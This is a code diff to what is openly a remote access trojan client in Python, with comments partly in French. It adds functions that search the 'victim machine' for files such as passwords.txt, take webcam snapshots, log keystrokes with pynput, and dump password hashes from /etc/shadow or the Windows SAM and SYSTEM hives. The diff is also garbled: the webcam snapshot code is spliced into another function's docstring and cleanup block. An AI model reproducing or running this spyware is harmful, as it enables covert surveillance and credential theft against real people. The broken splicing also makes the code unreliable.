@@ -18,6 +18,13 @@ from rat_project.utils.logger_config import setup_logger
 
 logger = setup_logger("client.actions")
 
+# ---------------------------------------------------------------------------
+# Keylogger state
+# ---------------------------------------------------------------------------
+
+_keylogger_listener = None  # pynput Listener instance, or None if not running
+_keylogger_buffer: list[str] = []
+
 
 # ---------------------------------------------------------------------------
 # Helpers internes
@@ -153,6 +160,38 @@ def handle_upload(message: dict) -> dict:
 
 
 # ---------------------------------------------------------------------------
+# search — rechercher un fichier sur la machine victime
+# ---------------------------------------------------------------------------
+
+
+def search_file(filename: str) -> str:
+    """
+    Recherche un fichier par nom sur toute la machine victime.
+
+    Args:
+        filename: Nom du fichier à chercher (ex: "passwords.txt").
+
+    Returns:
+        str: Liste des chemins trouvés, ou message si aucun résultat.
+    """
+    results = []
+
+    # Recherche récursive depuis la racine
+    root = Path("C:/") if _get_os() == "Windows" else Path("/")
+
+    for path in root.rglob(filename):
+        try:
+            results.append(str(path))
+        except PermissionError:
+            continue
+
+    if not results:
+        return f"Aucun fichier trouvé pour : {filename}"
+
+    return "\n".join(results)
+
+
+# ---------------------------------------------------------------------------
 # Fonctions à implémenter dans les prochaines étapes
 # ---------------------------------------------------------------------------
 
@@ -194,6 +233,22 @@ def webcam_stream(conn: socket.socket) -> None:
 
     Args:
         conn: TLS socket connected to the server.
+
+# ---------------------------------------------------------------------------
+# webcam_snapshot — capture a photo from the victim's webcam
+# ---------------------------------------------------------------------------
+
+
+def webcam_snapshot() -> str:
+    """
+    Capture one frame from the victim's webcam.
+
+    Opens the default camera (index 0), reads one frame,
+    encodes it as JPEG, then returns it as a base64 string
+    so it can be sent over the JSON protocol.
+
+    Returns:
+        str: Base64-encoded JPEG image, or empty string on failure.
     """
     import cv2
 
@@ -234,3 +289,133 @@ def webcam_stream(conn: socket.socket) -> None:
         cam.release()
         conn.settimeout(None)  # restore blocking mode
         logger.info("webcam_stream: stopped")
+        logger.warning("webcam_snapshot: no webcam available (index 0)")
+        return ""
+
+    try:
+        success, frame = cam.read()
+        if not success:
+            logger.warning("webcam_snapshot: failed to read frame")
+            return ""
+
+        _, buffer = cv2.imencode(".jpg", frame)
+        encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
+        logger.info("webcam_snapshot: frame captured (%d bytes)", len(buffer))
+        return encoded
+
+    except Exception as exc:
+        logger.exception("webcam_snapshot error: %s", exc)
+        return ""
+
+    finally:
+        cam.release()
+# keylogger — record victim's keystrokes
+# ---------------------------------------------------------------------------
+
+
+def toggle_keylogger() -> str:
+    """
+    Start or stop the keylogger.
+
+    - First call  : starts a background listener, returns a confirmation.
+    - Second call : stops the listener, returns all captured keystrokes.
+
+    Uses pynput.keyboard.Listener which runs in a separate thread.
+    The global state (_keylogger_listener, _keylogger_buffer) is shared
+    between calls — no duplication between start and stop logic.
+
+    Returns:
+        str: Status message, or captured keystrokes on stop.
+    """
+    from pynput import keyboard
+
+    global _keylogger_listener, _keylogger_buffer
+
+    # --- Stop ---
+    if _keylogger_listener is not None:
+        _keylogger_listener.stop()
+        _keylogger_listener = None
+        captured = "".join(_keylogger_buffer)
+        _keylogger_buffer = []
+        logger.info("Keylogger stopped. %d chars captured.", len(captured))
+        return f"Keylogger stopped.\nCaptured keystrokes:\n{captured}"
+
+    # --- Start ---
+    def on_press(key: keyboard.Key) -> None:
+        try:
+            _keylogger_buffer.append(key.char)
+        except AttributeError:
+            # Special keys (Enter, Shift, etc.)
+            _keylogger_buffer.append(f"[{key.name}]")
+
+    _keylogger_listener = keyboard.Listener(on_press=on_press)
+    _keylogger_listener.start()
+    logger.info("Keylogger started.")
+    return "Keylogger started."
+# hashdump — récupération des hashes de mots de passe
+# ---------------------------------------------------------------------------
+
+
+def hashdump() -> str:
+    """
+    Retrieve password hashes depending on the OS.
+
+    - Linux   : reads /etc/shadow (requires root privileges)
+    - Windows : saves SAM and SYSTEM hives via reg.exe
+                (requires Administrator privileges)
+
+    Returns:
+        str: Shadow file content, saved hive paths, or an error message.
+    """
+    import subprocess
+    import tempfile
+    from pathlib import Path
+
+    os_name = _get_os()
+
+    if os_name == "Linux":
+        shadow_path = Path("/etc/shadow")
+        try:
+            content = shadow_path.read_text(encoding="utf-8")
+            logger.info("hashdump Linux: %d lines retrieved", content.count("\n"))
+            return content
+        except PermissionError:
+            logger.warning("hashdump: permission denied for %s (root required)", shadow_path)
+            return f"Error: permission denied to read {shadow_path} (root required)"
+        except FileNotFoundError:
+            return f"Error: {shadow_path} not found"
+        except Exception as exc:
+            logger.exception("hashdump Linux error: %s", exc)
+            return f"Error: {exc}"
+
+    elif os_name == "Windows":
+        try:
+            with tempfile.TemporaryDirectory() as tmpdir:
+                sam_path = str(Path(tmpdir) / "SAM")
+                system_path = str(Path(tmpdir) / "SYSTEM")
+
+                # Saves hives 
+                for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
+                    result = subprocess.run(
+                        ["reg", "save", hive, dest, "/y"],
+                        capture_output=True,
+                        text=True,
+                        check=False,
+                    )
+                    if result.returncode != 0:
+                        logger.warning("hashdump Windows error on %s: %s", hive, result.stderr.strip())
+                        return f"Error saving {hive}: {result.stderr.strip()}"
+
+                logger.info("hashdump Windows: SAM and SYSTEM hives saved")
+                return (
+                    f"Hives saved:\n"
+                    f"  SAM    -> {sam_path}\n"
+                    f"  SYSTEM -> {system_path}\n"
+                    "(Binary files — use secretsdump or impacket to extract hashes)"
+                )
+        except Exception as exc:
+            logger.exception("hashdump Windows error: %s", exc)
+            return f"Error: {exc}"
+
+    else:
+        return f"Unsupported OS for hashdump: {os_name}"
